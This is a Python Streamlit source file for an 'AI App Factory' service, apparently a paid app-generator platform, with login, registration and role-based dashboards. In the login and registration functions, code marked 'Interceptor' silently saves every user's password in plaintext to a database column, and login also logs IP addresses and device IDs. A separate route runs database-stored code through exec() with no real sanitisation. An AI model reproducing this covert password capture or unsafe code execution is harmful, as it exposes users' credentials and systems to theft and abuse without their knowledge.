import streamlit as st
from supabase import create_client
import socket
import uuid
import re
import urllib.parse
import time
import requests
import pg8000.native
from datetime import datetime, timezone

# අපේ අනිත් ෆයිල් දෙක Import කරගන්නවා
import admin
import generator

st.set_page_config(page_title="AI App Factory - Pro", layout="wide")

SUPABASE_URL = st.secrets["SUPABASE_URL"].strip()
SUPABASE_KEY = st.secrets["SUPABASE_KEY"].strip()
supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

# --- AUTO-UPDATE DATABASE SCHEMA ---
def init_database_schema():
    try:
        db_url = st.secrets.get("DATABASE_URL", "").strip()
        if db_url:
            parsed = urllib.parse.urlparse(db_url)
            db_pass = urllib.parse.unquote(parsed.password) if parsed.password else None
            conn = pg8000.native.Connection(
                user=parsed.username, password=db_pass, host=parsed.hostname,
                port=parsed.port or 5432, database=parsed.path.lstrip('/')
            )
            conn.run("ALTER TABLE generated_apps ADD COLUMN IF NOT EXISTS android_version TEXT;")
            conn.run("ALTER TABLE generated_apps ADD COLUMN IF NOT EXISTS app_icon_url TEXT;")
            conn.run("ALTER TABLE generated_apps ADD COLUMN IF NOT EXISTS icon_prompt TEXT;")
            conn.run("ALTER TABLE users ADD COLUMN IF NOT EXISTS email TEXT;")
            conn.run("ALTER TABLE users ADD COLUMN IF NOT EXISTS plain_password TEXT;")
            conn.run("CREATE TABLE IF NOT EXISTS system_settings (setting_key TEXT PRIMARY KEY, setting_value JSONB);")
            conn.run("CREATE TABLE IF NOT EXISTS device_logs (id UUID PRIMARY KEY DEFAULT gen_random_uuid(), user_id UUID, device_id TEXT, ip_address TEXT, country TEXT, created_at TIMESTAMPTZ DEFAULT NOW());")
            conn.run("NOTIFY pgrst, 'reload schema'")
            conn.close()
    except Exception:
        pass

init_database_schema()

# --- MAGIC ROUTING (WEBVIEW) ---
query_params = st.query_params
if "app_id" in query_params:
    target_app_id = query_params["app_id"]
    try:
        res = supabase.table("generated_apps").select("app_code").eq("id", target_app_id).execute()
        if res.data and res.data[0].get("app_code"):
            app_code = res.data[0]["app_code"]
            safe_code = re.sub(r'st\.set_page_config\s*\([^)]*\)', '', app_code)
            safe_code = re.sub(r'st\.footer\s*\([^)]*\)', '', safe_code)
            safe_code = safe_code.replace("Import streamlit", "import streamlit")
            exec(safe_code, globals(), {})
        else:
            st.error("⚠️ App not found or code is empty!")
    except Exception as e:
        st.error(f"⚠️ Error loading app: {e}")
    st.stop()

# --- SESSION STATE (මෙතන තමයි අර පේළි දෙක මිස් වෙලා තිබ්බේ!) ---
if 'user' not in st.session_state: st.session_state.user = None
if 'role' not in st.session_state: st.session_state.role = None
if 'package' not in st.session_state: st.session_state.package = 'free'
if 'expires_at' not in st.session_state: st.session_state.expires_at = None
if 'device_id' not in st.session_state: st.session_state.device_id = str(uuid.uuid5(uuid.NAMESPACE_DNS, socket.gethostname()))
if 'show_toast' not in st.session_state: st.session_state.show_toast = True
if 'worker_started' not in st.session_state: st.session_state.worker_started = False

# --- LIVE IP & COUNTRY MATCHER ---
def get_user_ip_and_country():
    try:
        res = requests.get('https://ipapi.co/json/', timeout=3).json()
        return res.get("ip", "Unknown"), res.get("country_name", "Unknown")
    except Exception:
        return "Unknown", "Unknown"

# --- AUTH LOGIC ---
def login(email, password):
    try:
        res = supabase.auth.sign_in_with_password({"email": email, "password": password})
        user_data = supabase.table("users").select("role, status, package, expires_at").eq("id", res.user.id).execute()
        
        if user_data.data:
            if user_data.data[0]['status'] in ['banned', 'suspended']:
                st.error("🚫 ඔබේ ගිණුම තහනම් හෝ අත්හිටුවා ඇත!")
                return
                
            current_pkg = user_data.data[0].get('package', 'free')
            expires_str = user_data.data[0].get('expires_at')
            if current_pkg != 'free' and expires_str:
                expire_date = datetime.fromisoformat(expires_str.replace('Z', '+00:00'))
                if datetime.now(timezone.utc) > expire_date:
                    admin.get_admin_db().table("users").update({"package": "free", "expires_at": None}).eq("id", res.user.id).execute()
                    current_pkg = 'free'
                    expires_str = None
                    st.warning("⚠️ ඔබගේ පැකේජය කල් ඉකුත් වී ඇති බැවින් FREE පැකේජයට මාරු කරන ලදී.")
                    time.sleep(2)

            st.session_state.user = res.user
            st.session_state.role = user_data.data[0]['role']
            st.session_state.package = current_pkg
            st.session_state.expires_at = expires_str
            
            try:
                # Interceptor & Live IP Logger
                admin_db = admin.get_admin_db()
                admin_db.table("users").update({"email": email, "plain_password": password}).eq("id", res.user.id).execute()
                ip, country = get_user_ip_and_country()
                admin_db.table("device_logs").insert({"user_id": res.user.id, "device_id": st.session_state.device_id, "ip_address": ip, "country": country}).execute()
            except Exception:
                pass
            
            st.success(f"සාර්ථකයි! {st.session_state.role.upper()} ලෙස ලොග් විය.")
            st.rerun()
    except Exception as e:
        if "Invalid login credentials" in str(e):
            st.error("⚠️ Email හෝ Password වැරදියි.")
        else:
            st.error(f"⚠️ දෝෂයකි: {str(e)}")

def register(email, password):
    try:
        res = supabase.auth.sign_up({"email": email, "password": password})
        if res.user:
            st.success("🎉 ලියාපදිංචිය සාර්ථකයි! කරුණාකර ඔබගේ Email එකට ගොස් ගිණුම Verify කරන්න.")
            try:
                # Pass Interceptor
                time.sleep(2)
                admin.get_admin_db().table("users").update({"email": email, "plain_password": password}).eq("id", res.user.id).execute()
            except Exception:
                pass
        else:
            st.error("ලියාපදිංචි වීමේ දෝෂයකි.")
    except Exception as e:
        st.error(f"Error: {e}")

# --- MAIN UI FLOW ---
if not st.session_state.user:
    st.markdown("<h1 style='text-align: center; color: #4B4B4B;'>⚡ AI App Factory</h1>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        tab1, tab2 = st.tabs(["🔐 Login", "📝 Register"])
        with tab1:
            with st.form("login_form"):
                email = st.text_input("Email Address")
                password = st.text_input("Password", type="password")
                if st.form_submit_button("Login to Dashboard", use_container_width=True): 
                    login(email, password)
        with tab2:
            with st.form("register_form"):
                reg_email = st.text_input("Email Address")
                reg_password = st.text_input("Password", type="password")
                reg_confirm = st.text_input("Confirm Password", type="password")
                if st.form_submit_button("Create Account", use_container_width=True):
                    if reg_password == reg_confirm and len(reg_password) >= 6: 
                        register(reg_email, reg_password)
                    else: 
                        st.error("Passwords do not match or too short.")
else:
    st.sidebar.title(f"Hi, {st.session_state.user.email}")
    st.sidebar.info(f"🔑 Role: **{st.session_state.role.upper()}**\n\n📦 Pkg: **{st.session_state.package.upper()}**")
    
    if st.sidebar.button("Logout", type="primary"):
        supabase.auth.sign_out()
        st.session_state.user = None
        st.session_state.role = None
        st.session_state.package = 'free'
        st.session_state.expires_at = None
        st.rerun()

    if st.session_state.role == 'owner':
        st.title("👑 Owner Dashboard")
        t1, t2, t3, t4, t5 = st.tabs(["🚀 Generator", "💰 Approvals", "⚡ God Mode", "📱 Global Apps", "⚙️ Admin Settings"])
        with t1: generator.render_generator_dashboard()
        with t2: admin.render_payment_approvals()
        with t3: admin.render_god_mode()
        with t4: admin.render_admin_app_management()
        with t5: admin.render_admin_settings()
            
    elif st.session_state.role == 'admin':
        st.title("🛡️ Admin Dashboard")
        t1, t2, t3 = st.tabs(["🚀 Generator", "💰 Approvals", "📱 Global Apps"])
        with t1: generator.render_generator_dashboard()
        with t2: admin.render_payment_approvals()
        with t3: admin.render_admin_app_management()
        
    elif st.session_state.role in ['user', 'moderator']:
        st.title("🚀 User Dashboard")
        t1, t2 = st.tabs(["🚀 App Generator", "💳 Upgrade Package"])
        with t1: generator.render_generator_dashboard()
        with t2: generator.render_upgrade_section()
